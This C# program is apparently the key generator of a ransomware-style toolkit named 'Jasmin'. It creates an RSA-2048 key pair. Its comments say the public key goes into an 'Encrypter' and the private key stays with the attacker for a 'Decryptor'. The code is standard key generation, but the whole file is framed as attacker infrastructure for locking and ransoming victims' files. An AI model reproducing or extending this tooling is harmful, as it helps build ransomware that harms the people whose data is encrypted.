using System;
using System.IO;
using System.Security.Cryptography;

namespace Jasmin_KeyGen
{
    /// <summary>
    /// RSA-2048 密钥对生成工具
    /// 用法: dotnet run
    /// 输出: jasmin_public.pem (内置到Encrypter) + jasmin_private.pem (攻击者保留,解密用)
    /// </summary>
    class Program
    {
        static void Main(string[] args)
        {
            using (var rsa = RSA.Create(2048))
            {
                string pubPem  = ExportPem(rsa, false);
                string privPem = ExportPem(rsa, true);

                File.WriteAllText("jasmin_public.pem", pubPem);
                File.WriteAllText("jasmin_private.pem", privPem);

                Console.WriteLine("[+] Generated jasmin_public.pem  (embed in Encrypter)");
                Console.WriteLine("[+] Generated jasmin_private.pem (keep secret, for Decryptor)");
                Console.WriteLine();
                Console.WriteLine("=== PUBLIC KEY ===");
                Console.WriteLine(pubPem);
            }
        }

        static string ExportPem(RSA rsa, bool includePrivate)
        {
            if (includePrivate)
                return new string(PemEncoding.Write("RSA PRIVATE KEY", rsa.ExportRSAPrivateKey()));
            else
                return new string(PemEncoding.Write("PUBLIC KEY", rsa.ExportSubjectPublicKeyInfo()));
        }
    }
}
